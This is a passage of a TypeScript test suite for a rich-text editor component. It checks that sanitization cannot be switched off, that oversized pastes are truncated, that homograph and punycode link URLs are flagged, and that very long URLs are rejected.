        }
      });
    });

    describe('No Bypass Mechanisms - Security Cannot Be Disabled', () => {
      it('should have no way to disable HTML entity escaping', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        // Verify no public properties or methods that could disable sanitization
        expect((el as any).disableSanitization).to.be.undefined;
        expect((el as any).unsafeHTML).to.be.undefined;
        expect((el as any).skipValidation).to.be.undefined;
        expect((el as any).allowUnsafeProtocols).to.be.undefined;
      });

      it('should have no way to disable protocol validation', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;

        // Verify properties that could disable security don't exist
        expect(link).to.not.have.property('validateUrls');
        expect(link).to.not.have.property('allowDangerousProtocols');
        expect(link).to.not.have.property('skipValidation');
      });

      it('should have no way to suppress security warnings', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        expect(el).to.not.have.property('suppressErrors');
        expect(el).to.not.have.property('suppressWarnings');
        expect(el).to.not.have.property('silentMode');
      });

      it('should have no way to disable JSON sanitization', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        expect((el as any).skipJSONValidation).to.be.undefined;
        expect((el as any).trustContent).to.be.undefined;
        expect((el as any).unsafeMode).to.be.undefined;
      });

      it('should have no way to bypass depth or node limits', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        expect((el as any).maxDepth).to.be.undefined;
        expect((el as any).maxNodes).to.be.undefined;
        expect((el as any).unlimitedNesting).to.be.undefined;
      });
    });

    describe('Security Finding #8 - Paste Size DoS Protection', () => {
      it('should handle extremely large pasted content without hanging', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const warnSpy = sinon.spy(console, 'warn');

        try {
          // Create a 2MB HTML string
          const huge = '<p>' + 'text '.repeat(400_000) + '</p>';
          expect(huge.length).to.be.greaterThan(1_000_000);

          // This should truncate and warn, not hang
          el.content = huge;
          await el.updateComplete;

          // Should have logged a warning about truncation
          expect(warnSpy.calledWith(sinon.match(/Pasted content too large/))).to.be.true;
        } finally {
          warnSpy.restore();
        }
      });

      it('should allow content under 1MB without warning', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const warnSpy = sinon.spy(console, 'warn');

        try {
          // Create a 500KB HTML string (under limit)
          const acceptable = '<p>' + 'text '.repeat(100_000) + '</p>';
          expect(acceptable.length).to.be.lessThan(1_000_000);

          el.content = acceptable;
          await el.updateComplete;

          // Should NOT warn about size
          expect(warnSpy.calledWith(sinon.match(/Pasted content too large/))).to.be.false;
        } finally {
          warnSpy.restore();
        }
      });
    });

    describe('Unicode Homograph Attack Detection', () => {
      it('should warn on Cyrillic characters in URL', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;

        // Use Cyrillic 'е' (U+0435) instead of Latin 'e' (U+0065)
        (link as any)._linkUrl = 'https://еxample.com';
        (link as any)._validateUrl();
        await link.updateComplete;

        expect((link as any)._validationError).to.include('non-English characters');
      });

      it('should warn on punycode (xn--) domains', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;

        (link as any)._linkUrl = 'https://xn--xample-9ua.com';
        (link as any)._validateUrl();
        await link.updateComplete;

        expect((link as any)._validationError).to.include('internationalized domain names');
      });

      it('should allow ASCII URLs without warning', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;

        (link as any)._linkUrl = 'https://example.com';
        (link as any)._validateUrl();
        await link.updateComplete;

        expect((link as any)._validationError).to.equal('');
      });

      it('should warn on mixed scripts (Greek, Arabic, etc)', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;

        // Greek letters that look like Latin
        (link as any)._linkUrl = 'https://gοοgle.com'; // Greek omicron (ο)
        (link as any)._validateUrl();
        await link.updateComplete;

        expect((link as any)._validationError).to.include('non-English characters');
      });
    });

    describe('URL Length Validation', () => {
      it('should reject extremely long URLs', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;

        // Create URL over 2048 characters
        (link as any)._linkUrl = 'https://example.com/' + 'a'.repeat(2100);
        (link as any)._validateUrl();
        await link.updateComplete;

        expect((link as any)._validationError).to.include('URL too long');
        expect((link as any)._validationError).to.include('2048');
      });

      it('should allow URLs under the length limit', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;

        // Create URL under 2048 characters
        (link as any)._linkUrl = 'https://example.com/' + 'a'.repeat(2000);
        (link as any)._validateUrl();
        await link.updateComplete;

        expect((link as any)._validationError).to.equal('');
      });

      it('should reject URL exactly at 2049 characters', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;

        // Create URL exactly at 2049 (1 over limit)
        const url = 'https://example.com/' + 'a'.repeat(2029);
        expect(url.length).to.equal(2049);

        (link as any)._linkUrl = url;
        (link as any)._validateUrl();
        await link.updateComplete;

        expect((link as any)._validationError).to.include('URL too long');
      });
    });
  });
});
